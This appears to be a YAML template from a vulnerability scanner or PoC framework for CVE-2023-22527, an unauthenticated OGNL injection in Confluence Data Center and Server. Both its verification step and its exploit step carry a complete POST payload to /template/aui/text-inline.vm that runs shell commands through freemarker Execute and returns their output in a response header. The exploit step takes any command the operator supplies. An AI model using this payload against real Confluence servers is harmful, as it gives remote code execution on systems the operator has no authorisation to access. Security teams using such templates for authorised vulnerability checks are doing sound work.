app: Atlassian Confluence
query: app:"Atlassian Confluence"
meta:
  name: Confluence 远程代码执行漏洞-CVE-2023-22527
  level: 4
  tags:
  - remote_code_execution
  description: Confluence 是由澳大利亚软件公司 Atlassian 开发的基于 Web 的企业 Wiki。Confluence Data
    Center and Server 版本（8.0 至 8.5.3）上存在 OGNL 注入漏洞，允许未经身份验证的攻击者在受影响的实例上实现 RCE。
  homepage: https://www.atlassian.com/software/confluence
  author: X prism
  references: ""
  solution: 升级至最新版本
  create_at: "2024-07-30 14:45:11"
  available: true
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /template/aui/text-inline.vm
          redirect: true
          header:
          - Content-Type: application/x-www-form-urlencoded
          params: label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new
            freemarker.template.utility.Execute()).exec({"id"}))
        response:
        - name: code
          value: "200"
          type: equals
        - name: header
          value: X-Cmd-Response
          type: contains
    exploit_steps:
      type: and
      params:
        name: CMD
        type: input
        value: whoami
      exploit:
      - request:
          method: POST
          path: /template/aui/text-inline.vm
          redirect: true
          header:
          - Content-Type: application/x-www-form-urlencoded
          params: label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new
            freemarker.template.utility.Execute()).exec({"{{exploit}}"}))
        response:
        - name: code
          value: "200"
          type: equals
        - name: header
          value: X-Cmd-Response
          type: contains
